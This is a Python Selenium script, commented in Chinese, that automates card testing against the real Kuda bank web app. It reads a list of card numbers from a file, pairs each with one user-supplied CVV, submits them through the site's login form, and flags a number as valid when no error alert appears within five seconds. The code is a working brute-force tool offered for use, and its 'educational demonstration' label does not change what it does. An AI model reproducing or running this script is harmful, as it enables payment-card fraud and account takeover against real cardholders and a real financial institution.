from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, ElementClickInterceptedException
import time

def setup_driver():
    """
    設置 Chrome WebDriver
    """
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-notifications")
    # 增加等待頁面載入完成的時間
    options.add_argument("--page-load-timeout=60")
    # 如需要無頭模式，請取消下面這行註釋
    # options.add_argument("--headless")
    
    driver = webdriver.Chrome(options=options)
    driver.set_page_load_timeout(60)
    driver.implicitly_wait(10)
    return driver

def read_card_numbers_from_file(file_path):
    """
    從文件讀取信用卡號
    """
    card_numbers = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                card_number = line.strip().replace(" ", "")
                if card_number:
                    card_numbers.append(card_number)
        print(f"從文件讀取了 {len(card_numbers)} 個卡號")
    except Exception as e:
        print(f"讀取文件時出錯: {e}")
        return []
    return card_numbers

def test_card_numbers(card_numbers, cvv):
    """
    在 Kuda 網站上測試所有卡號 (教育演示用途)
    
    此版本流程：
    1. 輸入卡號同使用者輸入嘅 CVV。
    2. 按下提交後等待 5 秒，觀察網頁有冇出現 class="Toaster__alert"。
       - 如果出現，則點擊 alert 右上嘅關閉按鈕 (class="Toaster__alert_close")
         並中斷當前卡號測試，進行下一個嘗試。
       - 如果 5 秒內完全無 alert 出現，就認定該卡號有效，並記錄成功結果。
    """
    driver = setup_driver()
    
    try:
        # 打開 Kuda 網站
        driver.get("https://app.kuda.com/")
        print("已打開 Kuda 網站，等待目標元素出現...")
        
        # 定義主要同備用嘅輸入框選擇器
        first_input_selector = "#kuda-dashboard-container > div.sc-fBdRDi.dVTJRh > div.sc-kAyceB.kteYRM.login-card--wrap.auth-wrap.kudaAnimated.kudaFadeInUp.text-center > div.margin-bottom-5.text-left.text-sm.margin-top-5 > div:nth-child(1) > div > input"
        alternative_input_selector = "#kuda-dashboard-container > div.sc-bmzYkS.iqsCxm > div.sc-kAyceB.kteYRM.login-card--wrap.auth-wrap.kudaAnimated.kudaFadeInUp.text-center > div.margin-bottom-5.text-left.text-sm.margin-top-5 > div:nth-child(1) > div > input"
        
        wait = WebDriverWait(driver, 300)
        try:
            first_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, first_input_selector)))
        except:
            print("找不到主要選擇器，嘗試使用備用選擇器...")
            first_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, alternative_input_selector)))
            first_input_selector = alternative_input_selector
        
        print("找到目標元素，3秒後開始測試...")
        time.sleep(3)
        
        # 逐一測試每個卡號
        for i, card_number in enumerate(card_numbers):
            print(f"測試第 {i+1}/{len(card_numbers)} 個卡號...")
            
            max_retries = 3
            retry_count = 0
            
            while retry_count < max_retries:
                try:
                    # 輸入第一個欄位：卡號
                    try:
                        first_input = driver.find_element(By.CSS_SELECTOR, first_input_selector)
                    except:
                        first_input = driver.find_element(By.CSS_SELECTOR, alternative_input_selector)
                        first_input_selector = alternative_input_selector
                        
                    first_input.clear()
                    first_input.send_keys(card_number)
                    
                    # 輸入第二個欄位：使用者輸入的 CVV
                    second_input_selector = first_input_selector.replace("nth-child(1)", "nth-child(2)")
                    try:
                        second_input = driver.find_element(By.CSS_SELECTOR, second_input_selector)
                    except:
                        print("找不到第二個輸入框，嘗試使用XPath...")
                        xpath = "//input[contains(@class, 'input')]/../../following-sibling::div//input"
                        second_input = driver.find_element(By.XPATH, xpath)
                    
                    second_input.clear()
                    second_input.send_keys(cvv)
                    
                    # 尋找提交按鈕並點擊
                    try:
                        submit_button = driver.find_element(By.CSS_SELECTOR, ".sc-dcJsrY.fHCwbu")
                        print("找到提交按鈕")
                        WebDriverWait(driver, 30).until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".sc-dcJsrY.fHCwbu")))
                        try:
                            submit_button.click()
                        except ElementClickInterceptedException:
                            print("按鈕被攔截，使用 JavaScript 點擊...")
                            driver.execute_script("arguments[0].click();", submit_button)
                    except Exception as button_error:
                        print(f"使用 class 找提交按鈕失敗: {button_error}")
                        driver.execute_script("""
                            var buttons = document.querySelectorAll('button');
                            for(var i=0; i<buttons.length; i++) {
                                if(buttons[i].innerText.includes('Continue') || 
                                   buttons[i].innerText.includes('繼續') ||
                                   buttons[i].className.includes('sc-dcJsrY fHCwbu')) {
                                    buttons[i].click();
                                    return true;
                                }
                            }
                            return false;
                        """)
                        time.sleep(1)
                    
                    # 等待 5 秒，檢查是否有 alert 出現 (class="Toaster__alert")
                    try:
                        WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.CLASS_NAME, "Toaster__alert"))
                        )
                        # 如果 alert 出現，點擊關閉按鈕
                        try:
                            close_button = driver.find_element(By.CLASS_NAME, "Toaster__alert_close")
                            close_button.click()
                            print(f"卡號測試顯示錯誤訊息，已點擊關閉，繼續下一個卡號")
                        except Exception as close_err:
                            print(f"發生錯誤：無法關閉 alert: {close_err}")
                        break  # 結束本卡號嘗試，進行下一個卡號
                    except TimeoutException:
                        # 若 5 秒內完全無 alert 出現，即認定卡號有效
                        print("\n成功！已找到有效卡號組合")
                        return True
                    
                    # 若未成功，稍等再試
                    print("等待頁面響應...")
                    time.sleep(5)
                    retry_count += 1
                    if retry_count < max_retries:
                        print(f"卡號測試結果不確定，重試第 {retry_count+1} 次...")
                    else:
                        print(f"卡號測試失敗，已達最大重試次數，繼續下一個")
                        break
                
                except Exception as e:
                    print(f"測試卡號時出錯: {str(e)}")
                    retry_count += 1
                    if retry_count < max_retries:
                        print(f"重試第 {retry_count} 次...")
                        time.sleep(10)
                    else:
                        print(f"卡號測試失敗，已達最大重試次數，繼續下一個")
                        break
        
        print("所有卡號都已測試完畢，未找到有效卡號")
        return False
    
    finally:
        print("測試完成，關閉瀏覽器")
        driver.quit()

def main():
    print("============ Kuda 卡號自動測試工具 ============")
    
    # 讓用戶輸入檔案路徑
    file_path = input("請輸入卡號檔案的路徑: ")
    
    # 讓用戶輸入CVV
    cvv = input("請輸入CVV碼: ")
    
    # 驗證CVV格式
    while not (cvv.isdigit() and len(cvv) == 3):
        print("CVV必須是3位數字，請重新輸入")
        cvv = input("請輸入CVV碼: ")
    
    card_numbers = read_card_numbers_from_file(file_path)
    
    if not card_numbers:
        print("沒有找到卡號，程式結束")
        return
    
    print(f"開始測試 {len(card_numbers)} 個卡號...")
    is_successful = test_card_numbers(card_numbers, cvv)
    
    if is_successful:
        print("\n測試完成！卡號驗證成功")
        print("請返回應用程式查看卡片詳情")
    else:
        print("\n測試完成，未找到有效卡號")

if __name__ == "__main__":
    main()
